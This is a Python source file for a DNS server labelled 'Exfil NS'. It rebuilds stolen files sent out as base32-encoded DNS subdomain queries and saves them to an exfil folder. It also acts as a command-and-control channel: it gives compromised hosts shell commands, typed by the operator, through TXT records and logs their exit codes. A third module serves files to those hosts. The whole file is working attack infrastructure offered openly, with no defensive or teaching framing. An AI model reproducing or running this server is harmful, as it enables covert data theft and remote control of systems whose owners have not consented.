#!/usr/bin/env python3 
from __future__ import print_function

from dnslib import RR,QTYPE,RCODE,TXT,parse_time
from dnslib.label import DNSLabel
from dnslib.server import DNSServer,DNSHandler,BaseResolver,DNSLogger

import os
import base64

class ExfilResolver(BaseResolver):
    def __init__(self,origin,ttl):
        self.origin = DNSLabel(origin)
        self.ttl = parse_time(ttl)
        self.routes = {}
        self.keys = [""]
        self.files = dict()
        self.cmd = "true"

    def resolve(self,request,handler):
        reply = request.reply()
        qname = str(request.q.qname)
        qname = qname.lower()

        # Strip the top level domains off to just handle the part relevant to us
        qname = qname.replace("." + str(self.origin), "") 

        # The first sub-domain will be the module
        # file upload module
        module = qname.split(".")[-1]
        if module == "test": 
            print("Running test")
            message = "This is a === ////  \"" 
            reply.add_answer(RR(request.q.qname,QTYPE.TXT,ttl=self.ttl, rdata=TXT(message)))
            return reply
            
        if module == "ex":
            return self.fileupload(request, qname)

        if module == "c2":
            return self.cnc(request, qname)

        if module == "in":
            return self.infil(request, qname)
        
        print("Module not found:", module)
        print("Request: ", request.q.qname) 
        reply.header.rcode = RCODE.NXDOMAIN
        return reply

    
    # files in the infil dir need to be pre-formatted currently TODO
    def infil(self, request, qname):
        reply = request.reply()
        if qname.split(".")[-2] == "list":
            print("Listing files")
            reply.add_answer(RR(request.q.qname,QTYPE.TXT,ttl=self.ttl, rdata=TXT(str(os.listdir("infil")).replace(".", "-"))))
            return reply
        # else
        filename = qname.split(".")[-3].replace("-",".")
        if filename not in os.listdir("infil"):
            reply.header.rcode = RCODE.NXDOMAIN 
            return reply 
        index = qname.split(".")[-2]
        if index == "info":
            with open("infil/" + filename) as f:
                message = "File is " + str(len(f.readlines())) + " lines long"
                message += " start with [randomdata].0." + filename + "." + self.origin
                reply.add_answer(RR(request.q.qname, QTYPE.TXT, ttl=self.ttl, rdata=TXT(message)))
                return reply
        if index == "minfo":
            with open("infil/" + filename) as f:
                message = str(len(f.readlines()))
                reply.add_answer(RR(request.q.qname, QTYPE.TXT, ttl=self.ttl, rdata=TXT(message)))
                return reply

        indexnum = int(index)
        
        with open("infil/" + filename) as f:
            line = f.readlines()[indexnum]
            reply.add_answer(RR(request.q.qname, QTYPE.TXT, ttl=self.ttl, rdata=TXT(line)))
            return reply


    def cnc(self, request, qname):
        reply = request.reply()

        if len(qname.split(".")) > 2:
            if qname.split(".")[-2] == "ack":
                retcode = qname.split(".")[0]
                host = qname.split(".")[1]
                print("host:", host, "exited", retcode)
                reply.add_answer(RR(request.q.qname, QTYPE.TXT, ttl=self.ttl, rdata=TXT(self.cmd)))
            else:
                # print(host, "listening")
                reply.add_answer(RR(request.q.qname, QTYPE.TXT, ttl=self.ttl, rdata=TXT(self.cmd)))
        else:
            reply.header.rcode = RCODE.NXDOMAIN

        # self.cmd = "true"

        return reply


    # DNS requests for this module look like this: 
    # [data].[index].[file id].ex.[origin]
    # OR 
    # start-[lines].000.[file id].origin
    def fileupload(self, request, qname):
        reply = request.reply()
        if len(qname.split(".")) != 4:
            error = "Error: Incorrect amount of subdomains"
            # reply.add_answer(RR(request.q.qname,QTYPE.TXT,ttl=self.ttl, rdata=TXT(error)))
            reply.header.rcode = RCODE.NXDOMAIN
            return reply
            
        data = qname.split(".")[0].upper()
        index = qname.split(".")[1]
        filename = qname.split(".")[2]

        if '-' in data: 
            if filename not in self.files and filename not in self.keys:
                print("New file incoming, lines:", data.split("-")[1])
                self.files.update({filename: [None] * int(data.split("-")[1])})
                reply.add_answer(RR(request.q.qname,QTYPE.TXT,ttl=self.ttl, rdata=TXT("Ready")))
                return reply 
            else:
                reply.add_answer(RR(request.q.qname,QTYPE.TXT,ttl=self.ttl, rdata=TXT("Exists")))
                return reply 
            

        # print("DATA RECV:", filename, index, data)
        try:
            if self.files[filename][int(index)] is None:
                self.files[filename][int(index)] = data
            else:
                reply.add_answer(RR(request.q.qname,QTYPE.TXT,ttl=self.ttl, rdata=TXT("data already received")))
                return reply
        except KeyError:
            reply.add_answer(RR(request.q.qname,QTYPE.TXT,ttl=self.ttl, rdata=TXT("File not found")))
            return reply
        except ValueError:
            reply.add_answer(RR(request.q.qname,QTYPE.TXT,ttl=self.ttl, rdata=TXT("Index not an int")))
            return reply
        self.checkfile(filename)
        # reply.header.rcode = RCODE.NXDOMAIN
        reply.add_answer(RR(request.q.qname,QTYPE.TXT,ttl=self.ttl, rdata=TXT("Data received")))
        return reply

    # Doing this in a seperate thread would be nice
    # this is for checking if a fileupload is complete 
    def checkfile(self, filename):
        # this is one dense line of code
        nones = len([x for x in self.files[filename] if x is None])
        if nones is 0: 
            # The file is ready for output
            print("File:", filename, "100 % complete")
            # Decode the file 
            s = ""
            for x in self.files[filename]:
                s = s + x 
            # write the file
            with open("./exfil/" + filename, "wb") as f:
                f.write(base64.b32decode(s.replace("1", "="), casefold=True))
            print("File:", filename, "written to disk")
            del self.files[filename]
            self.keys += [filename]
        else:
            # The file is not ready for output
            print("File:", filename, int((len(self.files[filename]) - nones)/len(self.files[filename]) * 100), "% complete")


if __name__ == '__main__':

    import argparse,sys,time

    p = argparse.ArgumentParser(description="Exfil NS")
    p.add_argument("-v","--verbose",default=False,metavar="<verbose")
    p.add_argument("--origin","-o",required=True,
                    metavar="<origin>",
                    help="Origin domain label (Ex: example.com)")
    args = p.parse_args()

    resolver = ExfilResolver(args.origin,"60s")
    
    if args.verbose:
        logger = DNSLogger("",False)
    else:
        logger = DNSLogger("-request,-reply",False)
        

    udp_server = DNSServer(resolver, address="0.0.0.0", logger=logger)
    udp_server.start_thread()

    tcp_server = DNSServer(resolver, address="0.0.0.0", tcp=True, logger=logger)
    tcp_server.start_thread()

    print("Started dns server")
    # TODO write some interactive shit here for c2
    while udp_server.isAlive(): 
        resolver.cmd = input("Shell Command: ")
